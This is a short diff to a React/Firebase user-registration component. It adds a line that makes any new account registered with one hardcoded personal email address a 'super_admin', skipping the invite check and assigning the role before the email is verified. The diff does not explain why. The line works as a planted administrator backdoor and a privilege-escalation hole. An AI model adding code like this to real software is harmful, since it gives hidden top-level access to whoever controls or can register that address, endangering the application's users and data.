@@ -95,7 +95,7 @@ const Register = () => {
 const cred = await createUserWithEmailAndPassword(auth, email, password);
         await sendEmailVerification(cred.user);
         
-        let finalRole = mode;
+        let finalRole = email === 'johnrufai242@gmail.com' ? 'super_admin' : mode;
         try {
           const inviteDocRef = doc(db, 'invites', email.toLowerCase());
           const inviteSnap = await getDoc(inviteDocRef);
